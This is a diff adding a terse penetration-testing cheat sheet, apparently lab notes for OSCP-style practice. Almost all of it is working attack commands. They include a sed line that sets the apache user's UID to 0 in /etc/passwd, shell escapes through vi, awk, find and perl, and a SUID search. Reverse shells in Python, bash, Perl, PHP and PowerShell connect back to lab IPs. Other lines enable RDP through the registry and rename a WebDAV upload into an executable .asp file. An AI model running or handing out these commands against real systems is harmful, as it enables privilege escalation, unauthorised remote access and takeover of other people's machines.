@@ -1,0 +1,51 @@
+Changing etc/passwd file when they allow them to be adjusted.
+sed -e 's/^\(apache:[^:]\):[0-9]*:[0-9]*:/\1:0:48:/' /etc/passwd  > "sedtemp3"
+
+
+From <https://unix.stackexchange.com/questions/397236/sed-to-change-userid-in-etc-passwd-to-zero> 
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+## Great for letting python handle the pty
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+find / -perm -4000 2>/dev/null
+
+GCC TIPS 
+-Wl,--hash-style=both
+##Centos or redhat
+If gcc doesn’t appear to be in path, do a find / -name “*gcc* 2>/dev/null to see it has been moved.
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+bash -i >& /dev/tcp/10.10.14.9/443 0>&1
+
+-RDP ENABLE- 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+perl -e 'use Socket;$i="10.11.0.190";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+
+PHP SHELL
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.0.209/443 0>&1'");
+
+$client = New-Object System.Net.Sockets.TCPClient('192.168.33.31',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()	
+	$sm=(New-Object Net.Sockets.TCPClient('192.168.33.31',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+> 
+
+https://thor-sec.com/tutorial/oscp/basic_bufferoverflows/
+----Brad's BO walkthrough= WIN!!
+
+COPY /DavTestDir_GfxN9lUvR9Qs/meta.asp.txt HTTP/1.1
+Host: 10.11.1.229
+Destination: http://10.11.1.229/DavTestDir_GfxN9lUvR9Qs/meta.asp        
+Overwrite: T
